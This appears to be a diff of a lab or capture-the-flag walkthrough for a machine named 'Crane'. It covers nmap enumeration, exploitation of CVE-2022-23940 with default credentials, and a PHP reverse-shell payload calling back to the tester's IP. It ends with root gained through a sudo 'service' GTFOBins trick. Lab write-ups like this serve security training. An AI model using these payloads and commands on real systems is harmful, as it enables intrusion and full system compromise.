@@ -3,7 +3,7 @@
 # 🐧Crane🐧
 ## Enumeration
 Nmap
-```
+```console
 $ nmap -sC -sV 192.168.196.146
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-06 20:32 AEDT
 Nmap scan report for 192.168.196.146
@@ -29,7 +29,7 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 tried mysql server but unable to login
-```
+```console
 $ mysql -u root -proot -h 192.168.196.146 
 ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.201' is not allowed to connect to this MySQL server
 ```
@@ -40,7 +40,7 @@ search and found the exploit in github
 
 https://github.com/manuelz120/CVE-2022-23940?tab=readme-ov-file
 Follow the instruction 
-```
+```console
 $ python3 exploit.py -h http://192.168.196.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.201\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 $ nc -lvnp 4444
 listening on [any] 4444 ...
@@ -50,7 +50,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 ## Privilege escalation
 run sudo -l and found i can run root with service command and no password
-```
+```console
 www-data@crane:/tmp$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on localhost:
@@ -62,9 +62,10 @@ User www-data may run the following commands on localhost:
 ```
 Search GTOFbins and found the command to exploit  
 https://gtfobins.org/gtfobins/service/#shell  
-```
+```console
 service ../../bin/sh
 ```
+```console
 www-data@crane:/tmp$ sudo /usr/sbin/service ../../bin/sh
 # id
 uid=0(root) gid=0(root) groups=0(root)
